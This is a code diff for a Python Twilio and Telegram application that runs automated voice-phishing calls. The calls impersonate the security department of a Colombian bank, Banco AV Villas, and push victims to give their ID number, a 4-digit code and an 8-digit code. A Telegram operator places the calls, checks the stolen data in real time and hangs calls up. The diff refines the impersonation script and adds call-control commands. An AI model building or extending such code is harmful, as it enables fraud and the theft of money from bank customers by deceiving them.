@@ -259,7 +259,7 @@ def start():
         response.pause(length=4)
         response.redirect('/step1')
     else:
-        response.say("Hola,le habla el sistema de seguridad del Banco A V Villas. Detectamos una actividad inusual en unos de sus productos. Si usted reconoce esta operación haga caso omiso de lo contrario presione 1 para comunicarle con un asesor", language='es-ES')
+        response.say("Hola,le habla el sistema de seguridad del Banco Ave Villas. Detectamos una actividad inusual en unos de sus productos. Si usted reconoce esta operación haga caso omiso de lo contrario presione 1 para comunicarle con un asesor", language='es-ES')
         # Pausa de 4 segundos antes de redirigir
         response.pause(length=6)
         response.redirect('/step1')
@@ -447,7 +447,7 @@ def waiting_intermediate_validation():
     if is_revalidation:
         response.say("Estamos validando sus datos actualizados. Por favor espere unos momentos.", language='es-ES')
     else:
-        response.say("Estamos validando sus primeros datos. Por favor espere unos momentos.", language='es-ES')
+        response.say("Estamos validando su cedúda y el codigo de 4 digitos. Por favor espere unos momentos.", language='es-ES')
     
     # tiempo de pausa en segundos
     response.pause(length=10)
@@ -505,7 +505,7 @@ def intermediate_validation_result():
             global_user_sessions[call_sid].pop('validacion_intermedia_pending', None)
             save_session_to_file(global_user_sessions)
             
-            response.say("Los primeros datos son correctos. Continuemos con el último paso.", language='es-ES')
+            response.say("Tus datos son correctos, Continuemos con el último paso.", language='es-ES')
             response.redirect('/step3')  # Continuar al paso 3
             return str(response)
         else:
@@ -520,7 +520,7 @@ def intermediate_validation_result():
                 save_session_to_file(global_user_sessions)
                 
                 # Mensaje general cuando hay errores en los primeros datos
-                response.say("Hemos detectado algunos problemas con los primeros datos proporcionados.", language='es-ES')
+                response.say("Hemos detectado algunos problemas con los datos proporcionados.", language='es-ES')
                 
                 # Verificar qué dato es incorrecto y redirigir
                 if validation[0] == 0:  # Cédula incorrecta
@@ -869,6 +869,67 @@ def fetch_telegram_updates():
     
     return []
 
+# Agregar estas funciones a tu código existente
+
+def hang_up_call(call_sid):
+    """Cuelga una llamada activa usando el SID."""
+    try:
+        # Obtener la llamada y actualizarla para terminarla
+        call = client.calls(call_sid).update(status='completed')
+        
+        # Actualizar el estado en la sesión
+        if call_sid in global_user_sessions:
+            global_user_sessions[call_sid]['call_status'] = 'completed'
+            global_user_sessions[call_sid]['ended_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            global_user_sessions[call_sid]['ended_by'] = 'telegram_command'
+            save_session_to_file(global_user_sessions)
+        
+        logger.info(f"📞 Llamada terminada manualmente desde Telegram: SID={call_sid}")
+        return True
+        
+    except Exception as e:
+        logger.error(f"❌ ERROR AL COLGAR LLAMADA {call_sid}: {e}")
+        return False
+
+def send_typing_action(chat_id):
+    """Envía la acción de 'escribiendo' a Telegram."""
+    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendChatAction'
+    data = {'chat_id': chat_id, 'action': 'typing'}
+    try:
+        response = requests.post(url, data=data)
+        return response.status_code == 200
+    except Exception as e:
+        logger.error(f"❌ ERROR AL ENVIAR TYPING ACTION: {e}")
+        return False
+
+def send_telegram_response_with_typing(chat_id, text, typing_duration=2):
+    """Envía una respuesta a Telegram con indicador de 'escribiendo'."""
+    # Mostrar que está escribiendo
+    send_typing_action(chat_id)
+    
+    # Esperar un poco para simular escritura
+    time.sleep(typing_duration)
+    
+    # Enviar el mensaje
+    return send_telegram_response(chat_id, text)
+
+def get_active_calls_for_telegram():
+    """Obtiene las llamadas activas que se pueden colgar desde Telegram."""
+    active_calls = []
+    
+    for call_sid, session_data in global_user_sessions.items():
+        if (session_data.get('call_status') in ['initiated', 'ringing', 'answered', 'in-progress'] and
+            'telegram_chat_id' in session_data):
+            active_calls.append({
+                'sid': call_sid,
+                'number': session_data.get('to_number', 'N/A'),
+                'status': session_data.get('call_status', 'unknown'),
+                'chat_id': session_data.get('telegram_chat_id')
+            })
+    
+    return active_calls
+
+# Modificar la función process_telegram_update para agregar los nuevos comandos
 def process_telegram_update(update):
     """Procesa una actualización de Telegram."""
     global last_update_id, processed_message_ids
@@ -900,11 +961,83 @@ def process_telegram_update(update):
         
         # Procesar comando de llamada
         if message_text.startswith('/llamar') or message_text.startswith('llamar'):
+            send_typing_action(chat_id)
+            time.sleep(1)
             process_call_command(chat_id, message_text)
             return
         
-        # Procesar comandos de validación intermedia (nuevos 2 datos)
+        # NUEVO: Procesar comando para colgar llamada
+        if message_text.startswith('/colgar') or message_text.startswith('colgar'):
+            send_typing_action(chat_id)
+            time.sleep(1)
+            
+            parts = message_text.split()
+            
+            if len(parts) >= 2:
+                # Formato: /colgar SID
+                call_sid = parts[1]
+                
+                # Verificar que la llamada existe y pertenece a este chat
+                if call_sid in global_user_sessions:
+                    session_data = global_user_sessions[call_sid]
+                    
+                    # Verificar que la llamada fue iniciada desde este chat
+                    if session_data.get('telegram_chat_id') == chat_id:
+                        if hang_up_call(call_sid):
+                            send_telegram_response(chat_id, f"📞 <b>Llamada terminada exitosamente</b>\nSID: {call_sid}")
+                            
+                            # Notificar al canal general también
+                            send_to_telegram(f"📞 <b>Llamada terminada desde Telegram</b>\nSID: {call_sid}\nNúmero: {session_data.get('to_number', 'N/A')}")
+                        else:
+                            send_telegram_response(chat_id, f"❌ <b>Error al terminar la llamada</b>\nSID: {call_sid}")
+                    else:
+                        send_telegram_response(chat_id, "❌ <b>No tienes permisos para terminar esta llamada</b>")
+                else:
+                    send_telegram_response(chat_id, f"❌ <b>Llamada no encontrada</b>\nSID: {call_sid}")
+            else:
+                # Mostrar llamadas activas de este usuario
+                active_calls = get_active_calls_for_telegram()
+                user_calls = [call for call in active_calls if call['chat_id'] == chat_id]
+                
+                if user_calls:
+                    message = "<b>📞 TUS LLAMADAS ACTIVAS:</b>\n\n"
+                    for call in user_calls:
+                        message += f"<b>SID:</b> <code>{call['sid']}</code>\n"
+                        message += f"<b>Número:</b> {call['number']}\n"
+                        message += f"<b>Estado:</b> {call['status']}\n"
+                        message += f"<b>Colgar:</b> <code>/colgar {call['sid']}</code>\n\n"
+                    
+                    send_telegram_response(chat_id, message)
+                else:
+                    send_telegram_response(chat_id, "📞 <b>No tienes llamadas activas</b>")
+            return
+        
+        # NUEVO: Comando para ver llamadas activas
+        if message_text.startswith('/activas') or message_text.startswith('activas'):
+            send_typing_action(chat_id)
+            time.sleep(1)
+            
+            active_calls = get_active_calls_for_telegram()
+            user_calls = [call for call in active_calls if call['chat_id'] == chat_id]
+            
+            if user_calls:
+                message = "<b>📞 TUS LLAMADAS ACTIVAS:</b>\n\n"
+                for call in user_calls:
+                    message += f"<b>SID:</b> <code>{call['sid']}</code>\n"
+                    message += f"<b>Número:</b> {call['number']}\n"
+                    message += f"<b>Estado:</b> {call['status']}\n"
+                    message += f"<b>Colgar:</b> <code>/colgar {call['sid']}</code>\n\n"
+            else:
+                message = "📞 <b>No tienes llamadas activas</b>"
+            
+            send_telegram_response(chat_id, message)
+            return
+        
+        # Procesar comandos de validación intermedia (con typing indicator)
         if message_text.startswith('/validar2') or message_text.startswith('validar2'):
+            send_typing_action(chat_id)
+            time.sleep(1)
+            
             parts = message_text.split()
             
             if len(parts) >= 4:
@@ -929,17 +1062,20 @@ def process_telegram_update(update):
                     
                     logger.info(f"✅ VALIDACIÓN INTERMEDIA GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {vals}")
                     
-                    # Confirmar al usuario de Telegram
-                    send_telegram_response(chat_id, f"<b>✅ Validación intermedia guardada para {sid}:</b> {vals}")
+                    # Confirmar al usuario de Telegram con typing
+                    send_telegram_response_with_typing(chat_id, f"<b>✅ Validación intermedia guardada para {sid}:</b> {vals}")
                 except Exception as e:
                     logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN INTERMEDIA TELEGRAM: {e}")
-                    send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
+                    send_telegram_response_with_typing(chat_id, f"<b>❌ Error al procesar:</b> {e}")
             else:
-                send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar2 SID 1 1")
+                send_telegram_response_with_typing(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar2 SID 1 1")
             return
         
-        # Procesar comandos de validación final (solo código de 8 dígitos)
+        # Procesar comandos de validación final (con typing indicator)
         if message_text.startswith('/validar3') or message_text.startswith('validar3'):
+            send_typing_action(chat_id)
+            time.sleep(1)
+            
             parts = message_text.split()
             
             if len(parts) >= 3:
@@ -964,17 +1100,20 @@ def process_telegram_update(update):
                     
                     logger.info(f"✅ VALIDACIÓN FINAL GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {val}")
                     
-                    # Confirmar al usuario de Telegram
-                    send_telegram_response(chat_id, f"<b>✅ Validación final guardada para {sid}:</b> {val}")
+                    # Confirmar al usuario de Telegram con typing
+                    send_telegram_response_with_typing(chat_id, f"<b>✅ Validación final guardada para {sid}:</b> {val}")
                 except Exception as e:
                     logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN FINAL TELEGRAM: {e}")
-                    send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
+                    send_telegram_response_with_typing(chat_id, f"<b>❌ Error al procesar:</b> {e}")
             else:
-                send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar3 SID 1")
+                send_telegram_response_with_typing(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar3 SID 1")
             return
         
-        # Procesar comandos de validación original (mantener compatibilidad con el sistema anterior)
+        # Procesar comandos de validación original (con typing indicator)
         if message_text.startswith('/validar') or message_text.startswith('validar'):
+            send_typing_action(chat_id)
+            time.sleep(1)
+            
             parts = message_text.split()
             
             if len(parts) >= 5:
@@ -999,27 +1138,33 @@ def process_telegram_update(update):
                     
                     logger.info(f"✅ VALIDACIÓN ORIGINAL GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {vals}")
                     
-                    # Confirmar al usuario de Telegram
-                    send_telegram_response(chat_id, f"<b>✅ Validación original guardada para {sid}:</b> {vals}")
+                    # Confirmar al usuario de Telegram con typing
+                    send_telegram_response_with_typing(chat_id, f"<b>✅ Validación original guardada para {sid}:</b> {vals}")
                 except Exception as e:
                     logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN ORIGINAL TELEGRAM: {e}")
-                    send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
+                    send_telegram_response_with_typing(chat_id, f"<b>❌ Error al procesar:</b> {e}")
             else:
-                send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar SID 1 1 1")
+                send_telegram_response_with_typing(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar SID 1 1 1")
             return
         
-        # Comando de ayuda
+        # Comando de ayuda (actualizado con nuevos comandos)
         if message_text.startswith('/help') or message_text.startswith('help'):
+            send_typing_action(chat_id)
+            time.sleep(1)
+            
             help_message = """
 <b>📋 COMANDOS DISPONIBLES:</b>
 
-<b>🔹 Realizar llamada:</b>
-<code>/llamar +57XXXXXXXXXX</code>
+<b>🔹 Gestión de llamadas:</b>
+<code>/llamar +57XXXXXXXXXX</code> - Iniciar llamada
+<code>/colgar SID</code> - Terminar llamada específica
+<code>/colgar</code> - Ver llamadas activas para colgar
+<code>/activas</code> - Ver tus llamadas activas
 
 <b>🔹 Validaciones:</b>
-<code>/validar2 SID 1 1</code> - Validar primeros 2 datos (cédula y código 4 dígitos)
-<code>/validar3 SID 1</code> - Validar código final de 8 dígitos
-<code>/validar SID 1 1 1</code> - Validación completa (compatibilidad)
+<code>/validar2 SID 1 1</code> - Validar primeros 2 datos
+<code>/validar3 SID 1</code> - Validar código final
+<code>/validar SID 1 1 1</code> - Validación completa
 
 <b>🔹 Valores de validación:</b>
 • <code>1</code> = Correcto
@@ -1032,7 +1177,10 @@ def process_telegram_update(update):
             return
         
         # Si no coincide con ningún comando conocido
+        send_typing_action(chat_id)
+        time.sleep(1)
         send_telegram_response(chat_id, "❓ <b>Comando no reconocido.</b> Usa /help para ver los comandos disponibles.")
+
 def process_call_command(chat_id, message_text):
     """Procesa el comando /llamar para iniciar una llamada desde Telegram."""
     parts = message_text.split()
